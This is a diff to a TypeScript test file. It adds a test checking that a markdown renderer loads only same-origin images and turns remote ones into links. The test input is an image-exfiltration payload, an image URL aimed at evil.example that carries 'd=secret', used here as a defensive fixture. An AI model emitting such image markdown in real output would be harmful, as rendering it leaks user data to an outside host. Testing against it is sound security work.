@@ -9,6 +9,7 @@ import {
 	type CommandTrigger
 } from '../src/editors/command-menu.ts';
 import { lanes, monthGrid, step } from '../src/event-calendar/calendar.ts';
+import { markdown_html } from '../src/editors/markdown.ts';
 
 const slash: CommandTrigger = { char: '/', start: 'line', items: () => Effect.succeed([]) };
 const agent: CommandTrigger = { char: '/', start: 'text', items: () => Effect.succeed([]) };
@@ -105,4 +106,11 @@ test('overlapping events share lanes by cluster; a month is whole Monday-first w
 		1,
 		'Jan 31 + a month is February, not March'
 	);
+});
+
+test('Markdown loads only same-origin images; a remote one is a link, never fetched on render', () => {
+	const remote = markdown_html('![x](https://evil.example/p?d=secret) ![y](//evil.example/q)');
+	assert.doesNotMatch(remote, /<img/);
+	assert.match(remote, /<a href="https:\/\/evil\.example\/p\?d=secret" rel="noopener noreferrer nofollow"/);
+	assert.match(markdown_html('![chart](/files/chart.png)'), /<img src="\/files\/chart\.png"/);
 });
